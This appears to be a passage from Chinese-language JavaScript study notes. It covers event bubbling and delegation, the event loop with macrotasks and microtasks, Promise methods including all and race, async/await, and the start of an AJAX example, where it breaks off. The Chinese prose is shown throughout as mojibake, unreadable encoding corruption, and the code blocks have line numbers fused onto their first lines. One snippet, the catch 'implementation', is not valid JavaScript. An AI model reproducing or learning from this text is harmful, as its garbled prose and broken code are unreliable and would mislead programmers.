ï¼Œåœ¨äº‹ä»¶å†’æ³¡è¿‡ç¨‹ä¸­è¿™ä¸ªå€¼ä¸å˜ event.currentTarget = thisï¼Œæ—¶é—´å¸®é¡¶çš„å½“å‰å…ƒç´ ï¼Œåªæœ‰è¢«ç‚¹å‡»æ—¶ç›®æ ‡å…ƒç´ çš„targetæ‰ä¼šç­‰äºŽcurrentTargetï¼Œ æœ€åŽï¼Œå¯¹äºŽæ‰§è¡Œé¡ºåºçš„é—®é¢˜ï¼Œå¦‚æžœDOMèŠ‚ç‚¹åŒæ—¶ç»‘å®šäº†ä¸¤ä¸ªäº‹ä»¶ç›‘å¬å‡½æ•°ï¼Œä¸€ä¸ªç”¨äºŽæ•èŽ·ï¼Œä¸€ä¸ªç”¨äºŽå†’æ³¡ï¼Œé‚£ä¹ˆä¸¤ä¸ªäº‹ä»¶çš„æ‰§è¡Œé¡ºåºçœŸçš„æ˜¯å…ˆæ•èŽ·åœ¨å†’æ³¡å—ï¼Œç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œç»‘å®šåœ¨è¢«ç‚¹å‡»å…ƒç´ çš„äº‹ä»¶æ˜¯æŒ‰ç…§ä»£ç æ·»åŠ é¡ºåºæ‰§è¡Œçš„ï¼Œå…¶ä»–å‡½æ•°æ˜¯å…ˆæ•èŽ·å†å†’æ³¡ äº‹ä»¶ä»£ç†/äº‹ä»¶å§”æ‰˜ä¸åœ¨äº‹ä»¶çš„å‘ç”Ÿåœ°ï¼ˆç›´æŽ¥domï¼‰ä¸Šè®¾ç½®ç›‘å¬å‡½æ•°ï¼Œè€Œæ˜¯åœ¨å…¶çˆ¶å…ƒç´ ä¸Šè®¾ç½®ç›‘å¬å‡½æ•°ï¼Œé€šè¿‡äº‹ä»¶å†’æ³¡ï¼Œçˆ¶å…ƒç´ å¯ä»¥ç›‘å¬åˆ°å­å…ƒç´ ä¸Šäº‹ä»¶çš„è§¦å‘ï¼Œé€šè¿‡åˆ¤æ–­äº‹ä»¶å‘ç”Ÿå…ƒç´ DOMçš„ç±»åž‹ï¼Œæ¥åšå‡ºä¸åŒçš„å“åº”ã€‚ BOMäº‹ä»¶å¾ªçŽ¯EventLoopè¯¦ç»†æ­¥éª¤å¦‚ä¸‹ï¼š 1ã€æ‰€æœ‰åŒæ­¥ä»»åŠ¡éƒ½åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œå½¢æˆä¸€ä¸ªæ‰§è¡Œæ ˆ 2ã€ä¸»çº¿ç¨‹ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªâ€æ¶ˆæ¯é˜Ÿåˆ—â€ã€‚åªè¦å¼‚æ­¥æ“ä½œæ‰§è¡Œå®Œæˆï¼Œå°±åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­æŽ’é˜Ÿ 3ã€ä¸€æ—¦æ‰§è¡Œæ ˆä¸­çš„æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œç³»ç»Ÿå°±ä¼šæŒ‰æ¬¡åºè¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„å¼‚æ­¥ä»»åŠ¡ï¼ŒäºŽæ˜¯è¢«è¯»å–çš„å¼‚æ­¥ä»»åŠ¡ç»“æŸç­‰å¾…çŠ¶æ€ï¼Œè¿›å…¥æ‰§è¡Œæ ˆï¼Œå¼€å§‹æ‰§è¡Œ 4ã€ä¸»çº¿ç¨‹ä¸æ–­é‡å¤ä¸Šé¢çš„ç¬¬ä¸‰æ­¥ å®å¾®ä»»åŠ¡äº‹ä»¶å¾ªçŽ¯ä¸­çš„å¼‚æ­¥é˜Ÿåˆ—æœ‰ä¸¤ç§ï¼šmacroï¼ˆå®ä»»åŠ¡ï¼‰é˜Ÿåˆ—å’Œ microï¼ˆå¾®ä»»åŠ¡ï¼‰é˜Ÿåˆ—ã€‚å®ä»»åŠ¡é˜Ÿåˆ—å¯ä»¥æœ‰å¤šä¸ªï¼Œå¾®ä»»åŠ¡é˜Ÿåˆ—åªæœ‰ä¸€ä¸ªã€‚ å¸¸è§çš„ macro-task æ¯”å¦‚ï¼šsetTimeoutã€setIntervalã€ setImmediateã€scriptï¼ˆæ•´ä½“ä»£ç ï¼‰ã€ I/O æ“ä½œã€UI æ¸²æŸ“ç­‰ã€‚ å¸¸è§çš„ micro-task æ¯”å¦‚: process.nextTickã€new Promise().then(å›žè°ƒ)ã€MutationObserver(html5 æ–°ç‰¹æ€§) ç­‰ã€‚ å®ä»»åŠ¡æ¯æ¬¡æ‰§è¡Œæ ˆæ‰§è¡Œçš„ä»£ç å°±æ˜¯ä¸€ä¸ªå®ä»»åŠ¡é˜Ÿåˆ—ï¼Œç¬¬ä¸€ä¸ªå®ä»»åŠ¡é˜Ÿåˆ—åªæœ‰ä¸€ä¸ªä»»åŠ¡ï¼šæ‰§è¡Œä¸»çº¿ç¨‹çš„jsä»£ç  æµè§ˆå™¨ä¸ºäº†èƒ½å¤Ÿä½¿å¾—JSå†…éƒ¨Macrotaskä¸ŽDOMä»»åŠ¡èƒ½å¤Ÿæœ‰åºçš„æ‰§è¡Œï¼Œä¼šåœ¨ä¸€ä¸ªMacrotaskæ‰§è¡Œç»“æŸåŽï¼Œåœ¨ä¸‹ä¸€ä¸ªMacrotask æ‰§è¡Œå¼€å§‹å‰ï¼Œå¯¹é¡µé¢è¿›è¡Œé‡æ–°æ¸²æŸ“ï¼Œæµç¨‹å¦‚ä¸‹ï¼š 1Macrotask -&gt;æ¸²æŸ“-&gt; Macrotask -&gt;... Macrotaskä¸»è¦åŒ…å«ï¼š - script(æ•´ä½“ä»£ç ) - setTimeout - setInterval - I/O - UIäº¤äº’äº‹ä»¶ - postMessage - MessageChannel - setImmediate(Node.js çŽ¯å¢ƒ) å¾®ä»»åŠ¡å¯ä»¥ç†è§£æ˜¯åœ¨å½“å‰ task æ‰§è¡Œç»“æŸåŽç«‹å³æ‰§è¡Œçš„ä»»åŠ¡ã€‚åœ¨å½“å‰MacrotaskåŽï¼Œæ¸²æŸ“ä¸Žä¸‹ä¸€ä¸ªMacrotaskä¹‹å‰æ‰§è¡Œã€‚ åªæœ‰ä¸€ä¸ªå¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œä¸Šä¸€ä¸ªå®ä»»åŠ¡é˜Ÿåˆ—æ‰§è¡Œå®Œæ¯•åŽå¦‚æžœæœ‰å¾®ä»»åŠ¡é˜Ÿåˆ—å°±æ‰§è¡Œå…¶ä¸­æ‰€æœ‰å¾®ä»»åŠ¡ï¼Œå†æ‰§è¡Œä¸‹ä¸€ä¸ªå®ä»»åŠ¡é˜Ÿåˆ— å¼‚æ­¥generator promiseæ‰€è°“Promiseï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œé‡Œé¢ä¿å­˜ç€æŸä¸ªæœªæ¥æ‰ä¼šç»“æŸçš„äº‹ä»¶ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼‰çš„ç»“æžœã€‚ ä»Žè¯­æ³•ä¸Šè¯´ï¼ŒPromise æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä»Žå®ƒå¯ä»¥èŽ·å–å¼‚æ­¥æ“ä½œçš„æ¶ˆæ¯ã€‚Promise æä¾›ç»Ÿä¸€çš„ APIï¼Œå„ç§å¼‚æ­¥æ“ä½œéƒ½å¯ä»¥ç”¨åŒæ ·çš„æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚ Promiseæž„é€ å‡½æ•°æŽ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¯¥å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯resolveå’Œrejectã€‚å®ƒä»¬æ˜¯ä¸¤ä¸ªå‡½æ•°ï¼Œç”± JavaScript å¼•æ“Žæä¾›ï¼Œä¸ç”¨è‡ªå·±éƒ¨ç½²ã€‚ Promiseçš„ä¸‰ç§çŠ¶æ€ Promiseçš„æ‰§è¡Œé¡ºåºå½“æˆ‘ä»¬åœ¨æž„é€  Promise çš„æ—¶å€™ï¼Œæž„é€ å‡½æ•°å†…éƒ¨çš„ä»£ç æ˜¯ç«‹å³æ‰§è¡Œçš„ Promiseå¯¹è±¡æœ‰ä»¥ä¸‹ä¸¤ä¸ªç‰¹ç‚¹ã€‚ ï¼ˆ1ï¼‰å¯¹è±¡çš„çŠ¶æ€ä¸å—å¤–ç•Œå½±å“ã€‚Promiseå¯¹è±¡ä»£è¡¨ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œæœ‰ä¸‰ç§çŠ¶æ€ï¼špendingï¼ˆè¿›è¡Œä¸­ï¼‰ã€fulfilledï¼ˆå·²æˆåŠŸï¼‰å’Œrejectedï¼ˆå·²å¤±è´¥ï¼‰ã€‚åªæœ‰å¼‚æ­¥æ“ä½œçš„ç»“æžœï¼Œå¯ä»¥å†³å®šå½“å‰æ˜¯å“ªä¸€ç§çŠ¶æ€ï¼Œä»»ä½•å…¶ä»–æ“ä½œéƒ½æ— æ³•æ”¹å˜è¿™ä¸ªçŠ¶æ€ã€‚è¿™ä¹Ÿæ˜¯Promiseè¿™ä¸ªåå­—çš„ç”±æ¥ï¼Œå®ƒçš„è‹±è¯­æ„æ€å°±æ˜¯â€œæ‰¿è¯ºâ€ï¼Œè¡¨ç¤ºå…¶ä»–æ‰‹æ®µæ— æ³•æ”¹å˜ã€‚ ï¼ˆ2ï¼‰ä¸€æ—¦çŠ¶æ€æ”¹å˜ï¼Œå°±ä¸ä¼šå†å˜ï¼Œä»»ä½•æ—¶å€™éƒ½å¯ä»¥å¾—åˆ°è¿™ä¸ªç»“æžœã€‚Promiseå¯¹è±¡çš„çŠ¶æ€æ”¹å˜ï¼Œåªæœ‰ä¸¤ç§å¯èƒ½ï¼šä»Žpendingå˜ä¸ºfulfilledå’Œä»Žpendingå˜ä¸ºrejectedã€‚åªè¦è¿™ä¸¤ç§æƒ…å†µå‘ç”Ÿï¼ŒçŠ¶æ€å°±å‡å›ºäº†ï¼Œä¸ä¼šå†å˜äº†ï¼Œä¼šä¸€ç›´ä¿æŒè¿™ä¸ªç»“æžœï¼Œè¿™æ—¶å°±ç§°ä¸º resolvedï¼ˆå·²å®šåž‹ï¼‰ã€‚å¦‚æžœæ”¹å˜å·²ç»å‘ç”Ÿäº†ï¼Œä½ å†å¯¹Promiseå¯¹è±¡æ·»åŠ å›žè°ƒå‡½æ•°ï¼Œä¹Ÿä¼šç«‹å³å¾—åˆ°è¿™ä¸ªç»“æžœã€‚è¿™ä¸Žäº‹ä»¶ï¼ˆEventï¼‰å®Œå…¨ä¸åŒï¼Œäº‹ä»¶çš„ç‰¹ç‚¹æ˜¯ï¼Œå¦‚æžœä½ é”™è¿‡äº†å®ƒï¼Œå†åŽ»ç›‘å¬ï¼Œæ˜¯å¾—ä¸åˆ°ç»“æžœçš„ã€‚ promiseä¸€æ—¦æ–°å»ºï¼Œå°±ä¼šç«‹å³æ‰§è¡Œï¼Œæ— æ³•å–æ¶ˆ 1234567891011121314function loadImageAsync(url) &#123; return new Promise(function(resolve, reject) &#123; const image = new Image(); image.onload = function() &#123; resolve(image); &#125;; image.onerror = function() &#123; reject(new Error(&apos;Could not load image at &apos; + url)); &#125;; image.src = url; &#125;);&#125; // new Promise ä½¿ç”¨PromiseåŒ…è£…äº†ä¸€ä¸ªå›¾ç‰‡åŠ è½½çš„å¼‚æ­¥æ“ä½œã€‚å¦‚æžœåŠ è½½æˆåŠŸï¼Œå°±è°ƒç”¨resolveæ–¹æ³•ï¼Œå¦åˆ™å°±è°ƒç”¨rejectæ–¹æ³•ã€‚// resolveå‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œå°†Promiseå¯¹è±¡çš„çŠ¶æ€ä»Žâ€œæœªå®Œæˆâ€å˜ä¸ºâ€œæˆåŠŸâ€ï¼ˆå³ä»Ž pending å˜ä¸º resolvedï¼‰ï¼Œåœ¨å¼‚æ­¥æ“ä½œæˆåŠŸæ—¶è°ƒç”¨ï¼Œå¹¶å°†å¼‚æ­¥æ“ä½œçš„ç»“æžœï¼Œä½œä¸ºå‚æ•°ä¼ é€’å‡ºåŽ»ï¼›rejectå‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œå°†Promiseå¯¹è±¡çš„çŠ¶æ€ä»Žâ€œæœªå®Œæˆâ€å˜ä¸ºâ€œå¤±è´¥â€ï¼ˆå³ä»Ž pending å˜ä¸º rejectedï¼‰ï¼Œåœ¨å¼‚æ­¥æ“ä½œå¤±è´¥æ—¶è°ƒç”¨ï¼Œå¹¶å°†å¼‚æ­¥æ“ä½œæŠ¥å‡ºçš„é”™è¯¯ï¼Œä½œä¸ºå‚æ•°ä¼ é€’å‡ºåŽ»ã€‚ Promiseå®žä¾‹ç”Ÿæˆä»¥åŽï¼Œå¯ä»¥ç”¨thenæ–¹æ³•åˆ†åˆ«æŒ‡å®šresolvedçŠ¶æ€å’ŒrejectedçŠ¶æ€çš„å›žè°ƒå‡½æ•°ã€‚ then12345promise.then(function(value) &#123; // success value from resolve(value)&#125;, function(error) &#123;// failure error from reject(error)&#125;); thenæ–¹æ³•å¯ä»¥æŽ¥å—ä¸¤ä¸ªå›žè°ƒå‡½æ•°ä½œä¸ºå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå›žè°ƒå‡½æ•°æ˜¯Promiseå¯¹è±¡çš„çŠ¶æ€å˜ä¸ºresolvedæ—¶è°ƒç”¨ï¼Œç¬¬äºŒä¸ªå›žè°ƒå‡½æ•°æ˜¯Promiseå¯¹è±¡çš„çŠ¶æ€å˜ä¸ºrejectedæ—¶è°ƒç”¨ã€‚å…¶ä¸­ï¼Œç¬¬äºŒä¸ªå‡½æ•°æ˜¯å¯é€‰çš„ï¼Œä¸ä¸€å®šè¦æä¾›ã€‚è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æŽ¥å—Promiseå¯¹è±¡ä¼ å‡ºçš„å€¼ä½œä¸ºå‚æ•°ã€‚ thenæ–¹æ³•è¿”å›žçš„æ˜¯ä¸€ä¸ªæ–°çš„Promiseå®žä¾‹ï¼ˆæ³¨æ„ï¼Œä¸æ˜¯åŽŸæ¥é‚£ä¸ªPromiseå®žä¾‹ï¼‰ã€‚å› æ­¤å¯ä»¥é‡‡ç”¨é“¾å¼å†™æ³•ï¼Œå³thenæ–¹æ³•åŽé¢å†è°ƒç”¨å¦ä¸€ä¸ªthenæ–¹æ³•ã€‚ 12345getJSON(&quot;/posts.json&quot;).then(function(json) &#123; return json.post;&#125;).then(function(post) &#123; // ...&#125;); catchPromise.prototype.catchæ–¹æ³•æ˜¯.then(null, rejection)æˆ–.then(undefined, rejection)çš„åˆ«åï¼Œç”¨äºŽæŒ‡å®šå‘ç”Ÿé”™è¯¯æ—¶çš„å›žè°ƒå‡½æ•°ã€‚ 1Promise.prototype.catch=(fn(err)) =&gt;&#123; return Promise.prototype.then(null, fn(err));&#125; finallyç”¨äºŽæŒ‡å®šä¸ç®¡ Promise å¯¹è±¡æœ€åŽçŠ¶æ€å¦‚ä½•ï¼Œéƒ½ä¼šæ‰§è¡Œçš„æ“ä½œã€‚è¯¥æ–¹æ³•æ˜¯ ES2018 å¼•å…¥æ ‡å‡†çš„ã€‚ finallyæ–¹æ³•çš„å›žè°ƒå‡½æ•°ä¸æŽ¥å—ä»»ä½•å‚æ•°ï¼Œè¿™æ„å‘³ç€æ²¡æœ‰åŠžæ³•çŸ¥é“ï¼Œå‰é¢çš„ Promise çŠ¶æ€åˆ°åº•æ˜¯fulfilledè¿˜æ˜¯rejectedã€‚è¿™è¡¨æ˜Žï¼Œfinallyæ–¹æ³•é‡Œé¢çš„æ“ä½œï¼Œåº”è¯¥æ˜¯ä¸ŽçŠ¶æ€æ— å…³çš„ï¼Œä¸ä¾èµ–äºŽ Promise çš„æ‰§è¡Œç»“æžœã€‚ 123456789//å®žçŽ°Promise.prototype.finally = function (callback) &#123; let P = this.constructor; return this.then( value =&gt; P.resolve(callback()).then(() =&gt; value), reason =&gt; P.resolve(callback()).then(() =&gt; &#123; throw reason &#125;) );&#125;; allç”¨äºŽå°†å¤šä¸ª Promise å®žä¾‹ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®žä¾‹ Promise.all(iterable) è¿”å›žä¸€ä¸ªæ–°çš„ Promise å®žä¾‹ã€‚æ­¤å®žä¾‹åœ¨ iterable å‚æ•°å†…æ‰€æœ‰çš„ promise éƒ½ fulfilled æˆ–è€…å‚æ•°ä¸­ä¸åŒ…å« promise æ—¶ï¼ŒçŠ¶æ€å˜æˆ fulfilledï¼›å¦‚æžœå‚æ•°ä¸­ promise æœ‰ä¸€ä¸ªå¤±è´¥rejectedï¼Œæ­¤å®žä¾‹å›žè°ƒå¤±è´¥ï¼Œå¤±è´¥åŽŸå› çš„æ˜¯ç¬¬ä¸€ä¸ªå¤±è´¥ promise çš„è¿”å›žç»“æžœã€‚ 1const p = Promise.all([p1, p2, p3]); ä¸Šé¢ä»£ç ä¸­ï¼ŒPromise.allæ–¹æ³•æŽ¥å—ä¸€ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°ï¼Œp1ã€p2ã€p3éƒ½æ˜¯ Promise å®žä¾‹ï¼Œå¦‚æžœä¸æ˜¯ï¼Œå°±ä¼šå…ˆè°ƒç”¨ä¸‹é¢è®²åˆ°çš„Promise.resolveæ–¹æ³•ï¼Œå°†å‚æ•°è½¬ä¸º Promise å®žä¾‹ï¼Œå†è¿›ä¸€æ­¥å¤„ç†ã€‚ï¼ˆPromise.allæ–¹æ³•çš„å‚æ•°å¯ä»¥ä¸æ˜¯æ•°ç»„ï¼Œä½†å¿…é¡»å…·æœ‰ Iterator æŽ¥å£ï¼Œä¸”è¿”å›žçš„æ¯ä¸ªæˆå‘˜éƒ½æ˜¯ Promise å®žä¾‹ã€‚ï¼‰ pçš„çŠ¶æ€ç”±p1ã€p2ã€p3å†³å®šï¼Œåˆ†æˆä¸¤ç§æƒ…å†µã€‚ ï¼ˆ1ï¼‰åªæœ‰p1ã€p2ã€p3çš„çŠ¶æ€éƒ½å˜æˆfulfilledï¼Œpçš„çŠ¶æ€æ‰ä¼šå˜æˆfulfilledï¼Œæ­¤æ—¶p1ã€p2ã€p3çš„è¿”å›žå€¼ç»„æˆä¸€ä¸ªæ•°ç»„ï¼Œä¼ é€’ç»™pçš„å›žè°ƒå‡½æ•°ã€‚ ï¼ˆ2ï¼‰åªè¦p1ã€p2ã€p3ä¹‹ä¸­æœ‰ä¸€ä¸ªè¢«rejectedï¼Œpçš„çŠ¶æ€å°±å˜æˆrejectedï¼Œæ­¤æ—¶ç¬¬ä¸€ä¸ªè¢«rejectçš„å®žä¾‹çš„è¿”å›žå€¼ï¼Œä¼šä¼ é€’ç»™pçš„å›žè°ƒå‡½æ•°ã€‚ Promise.all çš„ç‰¹ç‚¹ Promise.all çš„è¿”å›žå€¼æ˜¯ä¸€ä¸ª promise å®žä¾‹ å¦‚æžœä¼ å…¥çš„å‚æ•°ä¸ºç©ºçš„å¯è¿­ä»£å¯¹è±¡ï¼ŒPromise.all ä¼š åŒæ­¥ è¿”å›žä¸€ä¸ªå·²å®ŒæˆçŠ¶æ€çš„ promise å¦‚æžœä¼ å…¥çš„å‚æ•°ä¸­ä¸åŒ…å«ä»»ä½• promise,Promise.all ä¼š å¼‚æ­¥ è¿”å›žä¸€ä¸ªå·²å®ŒæˆçŠ¶æ€çš„ promise å…¶å®ƒæƒ…å†µä¸‹ï¼ŒPromise.all è¿”å›žä¸€ä¸ª å¤„ç†ä¸­ï¼ˆpendingï¼‰ çŠ¶æ€çš„ promise. Promise.all è¿”å›žçš„ promise çš„çŠ¶æ€ å¦‚æžœä¼ å…¥çš„å‚æ•°ä¸­çš„ promise éƒ½å˜æˆå®ŒæˆçŠ¶æ€ï¼ŒPromise.all è¿”å›žçš„ promise å¼‚æ­¥åœ°å˜ä¸ºå®Œæˆã€‚ å¦‚æžœä¼ å…¥çš„å‚æ•°ä¸­ï¼Œæœ‰ä¸€ä¸ª promise å¤±è´¥ï¼ŒPromise.all å¼‚æ­¥åœ°å°†å¤±è´¥çš„é‚£ä¸ªç»“æžœç»™å¤±è´¥çŠ¶æ€çš„å›žè°ƒå‡½æ•°ï¼Œè€Œä¸ç®¡å…¶å®ƒ promise æ˜¯å¦å®Œæˆ åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼ŒPromise.all è¿”å›žçš„ promise çš„å®ŒæˆçŠ¶æ€çš„ç»“æžœéƒ½æ˜¯ä¸€ä¸ªæ•°ç»„ Promise.all å®žçŽ° 1Promise.all = function (promises) &#123; //promises æ˜¯å¯è¿­ä»£å¯¹è±¡ï¼Œçœç•¥å‚æ•°åˆæ³•æ€§æ£€æŸ¥ return new Promise((resolve, reject) =&gt; &#123; //Array.from å°†å¯è¿­ä»£å¯¹è±¡è½¬æ¢æˆæ•°ç»„ promises = Array.from(promises); if (promises.length === 0) &#123; resolve([]); &#125; else &#123; let result = []; let index = 0; for (let i = 0; i &lt; promises.length; i++ ) &#123; //è€ƒè™‘åˆ° i å¯èƒ½æ˜¯ thenable å¯¹è±¡ä¹Ÿå¯èƒ½æ˜¯æ™®é€šå€¼ Promise.resolve(promises[i]).then(data =&gt; &#123; result[i] = data; if (++index === promises.length) &#123; //æ‰€æœ‰çš„ promises çŠ¶æ€éƒ½æ˜¯ fulfilledï¼Œpromise.allè¿”å›žçš„å®žä¾‹æ‰å˜æˆ fulfilled æ€ resolve(result); &#125; &#125;, err =&gt; &#123; reject(err); return; &#125;); &#125; &#125; &#125;);&#125; racePromise.raceæ–¹æ³•åŒæ ·æ˜¯å°†å¤šä¸ª Promise å®žä¾‹ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®žä¾‹ã€‚ 1const p = Promise.race([p1, p2, p3]); ä¸Šé¢ä»£ç ä¸­ï¼Œåªè¦p1ã€p2ã€p3ä¹‹ä¸­æœ‰ä¸€ä¸ªå®žä¾‹çŽ‡å…ˆæ”¹å˜çŠ¶æ€ï¼Œpçš„çŠ¶æ€å°±è·Ÿç€æ”¹å˜ã€‚é‚£ä¸ªçŽ‡å…ˆæ”¹å˜çš„ Promise å®žä¾‹çš„è¿”å›žå€¼ï¼Œå°±ä¼ é€’ç»™pçš„å›žè°ƒå‡½æ•°ã€‚ 1const p = Promise.race([ fetch(&apos;/resource-that-may-take-a-while&apos;), new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; reject(new Error(&apos;request timeout&apos;)), 5000) &#125;)]);p.then(console.log).catch(console.error); ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æžœ 5 ç§’ä¹‹å†…fetchæ–¹æ³•æ— æ³•è¿”å›žç»“æžœï¼Œå˜é‡pçš„çŠ¶æ€å°±ä¼šå˜ä¸ºrejectedï¼Œä»Žè€Œè§¦å‘catchæ–¹æ³•æŒ‡å®šçš„å›žè°ƒå‡½æ•°ã€‚ async/awaitasyncå‡½æ•°è¿”å›žä¸€ä¸ª Promise å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨thenæ–¹æ³•æ·»åŠ å›žè°ƒå‡½æ•°ã€‚å½“å‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œä¸€æ—¦é‡åˆ°awaitå°±ä¼šå…ˆè¿”å›žï¼Œç­‰åˆ°å¼‚æ­¥æ“ä½œå®Œæˆï¼Œå†æŽ¥ç€æ‰§è¡Œå‡½æ•°ä½“å†…åŽé¢çš„è¯­å¥ã€‚ æ­£å¸¸æƒ…å†µä¸‹ï¼Œawaitå‘½ä»¤åŽæ˜¯ä¸€ä¸ªPromiseå¯¹è±¡ã€‚å¦‚æžœä¸æ˜¯ï¼Œä¼šè¢«è½¬æˆä¸€ä¸ªç«‹å³resolveçš„Promiseå¯¹è±¡ã€‚ awaitåªèƒ½ç”¨åœ¨asyncå‡½æ•°ä¸­ï¼Œä¸èƒ½ç”¨åœ¨æ™®é€šå‡½æ•°ä¸­ awaitåŽé¢å¯èƒ½å­˜åœ¨rejectï¼Œéœ€è¦è¿›è¡Œtryâ€¦catchä»£ç å—ä¸­ ä¼˜ç‚¹ï¼š å¤„ç† then çš„è°ƒç”¨é“¾ï¼Œèƒ½å¤Ÿæ›´æ¸…æ™°å‡†ç¡®çš„å†™å‡ºä»£ç ï¼› èƒ½ä¼˜é›…åœ°è§£å†³å›žè°ƒåœ°ç‹±é—®é¢˜ï¼› é€‚ç”¨æ€§æ›´å¹¿æ³›ï¼Œasync å‡½æ•°çš„ await å‘½ä»¤åŽé¢ï¼Œå¯ä»¥è·Ÿ Promise å¯¹è±¡å’ŒåŽŸå§‹ç±»åž‹çš„å€¼ï¼› è¯­ä¹‰æ€§æ›´å¼ºï¼Œä½¿å¾—å¼‚æ­¥ä»£ç è¯»èµ·æ¥åƒåŒæ­¥ä»£ç ï¼Œasync è¡¨ç¤ºå‡½æ•°é‡Œæœ‰å¼‚æ­¥æ“ä½œï¼Œawait è¡¨ç¤ºç´§è·Ÿåœ¨åŽé¢çš„è¡¨è¾¾å¼éœ€è¦ç­‰å¾…ç»“æžœã€‚ ç¼ºç‚¹ï¼š å¤šä¸ªæ²¡æœ‰ä¾èµ–æ€§çš„å¼‚æ­¥ä»£ç ä½¿ç”¨ awaitæ—¶ï¼Œ ä¼šå¯¼è‡´æ€§èƒ½ä¸Šçš„é™ä½Žã€‚ ä½¿ç”¨ async å£°æ˜Žå¼‚æ­¥å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°è¿”å›žä¸€ä¸ª AsyncFunction å¯¹è±¡ã€‚AsyncFunction å¯¹è±¡è¡¨ç¤ºè¯¥å‡½æ•°ä¸­åŒ…å«çš„ä»£ç çš„å¼‚æ­¥å‡½æ•°ã€‚ è°ƒç”¨ä½¿ç”¨ async å£°æ˜Žå‡½æ•°æ—¶ï¼Œå®ƒè¿”å›žä¸€ä¸ª Promiseã€‚å½“è¿™ä¸ªå‡½æ•°è¿”å›žä¸€ä¸ªå€¼æ—¶ï¼Œè¿™ä¸ªå€¼åªæ˜¯ä¸€ä¸ªæ™®é€šå€¼è€Œå·²ï¼Œè¿™ä¸ªå‡½æ•°å†…éƒ¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ‰¿è¯ºï¼Œå¹¶ä½¿ç”¨å‡½æ•°è¿”å›žçš„å€¼è¿›è¡Œè§£æžã€‚å½“è¿™ä¸ªå‡½æ•°æŠ›å‡ºå¼‚å¸¸æ—¶ï¼ŒPromise å°†è¢«æŠ›å‡ºçš„å€¼æ‹’ç»ã€‚ ä½¿ç”¨ async å£°æ˜Žå‡½æ•°æ—¶å¯ä»¥åŒ…å«ä¸€ä¸ª await ç¬¦å·ï¼Œawait æš‚åœè¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œå¹¶ç­‰å¾…ä¼ é€’çš„ Promise çš„è§£æžå®Œæˆï¼Œç„¶åŽæ¢å¤è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œå¹¶è¿”å›žè§£æžåŽçš„å€¼ã€‚ async/wait çš„ç›®çš„æ˜¯ç®€åŒ–ä½¿ç”¨Promiseçš„è¡Œä¸º è®©çœ‹çœ‹ä¸‹é¢çš„ä¾‹å­: 1234567function getNumber1() &#123; return Promise.resolve(&apos;374&apos;);&#125;// è¿™ä¸ªå‡½æ•°ä¸ŽgetNumber1ç›¸åŒasync function getNumber2() &#123; return 374;&#125; ç±»ä¼¼åœ°ï¼ŒæŠ›å‡ºå¼‚å¸¸çš„å‡½æ•°ç­‰ä»·äºŽè¿”å›žè¢«æ‹’ç»çš„ Promise çš„å‡½æ•°: 123456function f1() &#123; return Promise.reject(&apos;Some error&apos;);&#125;async function f2() &#123; throw &apos;Some error&apos;;&#125; await å…³é”®å­—åªèƒ½åœ¨å¼‚æ­¥å‡½æ•°ä¸­ä½¿ç”¨ï¼Œå¹¶å…è®¸åŒæ­¥ç­‰å¾… Promiseã€‚å¦‚æžœåœ¨ async å‡½æ•°ä¹‹å¤–ä½¿ç”¨ Promiseï¼Œä»ç„¶éœ€è¦ä½¿ç”¨ then å›žè°ƒ: 1234567891011121314151617181920212223242526function loadData() &#123; return getJSON() .then(function(response) &#123; if (response.needsAnotherRequest) &#123; return makeAnotherRequest(response) .then(function(anotherResponse) &#123; console.log(anotherResponse) return anotherResponse &#125;) &#125; else &#123; console.log(response) return response &#125; &#125;)&#125;async function loadData() &#123; var response = await getJSON(); if (response.needsAnotherRequest) &#123; var anotherResponse = await makeAnotherRequest(response); console.log(anotherResponse) return anotherResponse &#125; else &#123; console.log(response); return response; &#125;&#125; AJAXä»€ä¹ˆæ˜¯AJAX? AJAXå³ä¸€ç§å¼‚æ­¥è¯·æ±‚ï¼Œå¯ä»¥å®žçŽ°é¡µé¢å±€éƒ¨åˆ·æ–°ï¼› AJAXå®žçŽ°çš„æ­¥éª¤ï¼š åˆ›å»ºè¯·æ±‚å¯¹è±¡ ä¸ŽæœåŠ¡ç«¯åˆ›å»ºè¿žæŽ¥ï¼Œæ‰§è¡Œopenæ–¹æ³•ï¼› å‘é€è¯·æ±‚ï¼Œæ‰§è¡Œsendæ–¹æ³•ï¼› ä¸ºè¯·æ±‚å¯¹è±¡ç»‘å®šonreadystateäº‹ä»¶ï¼Œå½“readyStateä¸º4 ä¸” statusä¸º200æ—¶å¤„ç†æ•°æ®ï¼› åŽŸç”Ÿ Ajax 1234567891011121314151617181920212223242526272829var xhr = new 